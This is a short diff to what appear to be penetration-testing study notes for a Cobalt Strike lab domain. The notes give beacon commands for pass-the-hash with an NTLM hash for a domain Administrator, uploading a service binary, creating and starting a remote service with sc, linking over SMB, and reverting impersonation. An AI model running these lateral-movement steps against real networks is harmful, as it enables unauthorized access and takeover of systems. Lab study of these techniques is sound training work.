@@ -33,8 +33,7 @@ beacon> jump winrm64 sql-2.dev.cyberbotic.io Default_SMB_Listener
 ### Hash creds - pth
 
 ```bash
-beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
-beacon> steal_token <PID>
+beacon> pth DEV\Administrator 59fc0f884922b4ce376051134c71e22c
 // Example beacon spawn
 beacon> upload demo.svc.exe C:\Windows\Temp
 // Copy beacon to remote host & create service
@@ -43,6 +42,8 @@ beacon> shell sc \\172.16.48.121 create demopth binpath=C:\Windows\Temp\demo.svc
 beacon> shell sc \\172.16.48.121 start demopth
 // Connect to beacon w/ link (smb)
 beacon> link 172.16.48.83
+// Drop impoersonation
+beacon> rev2self
 ```
 
 \
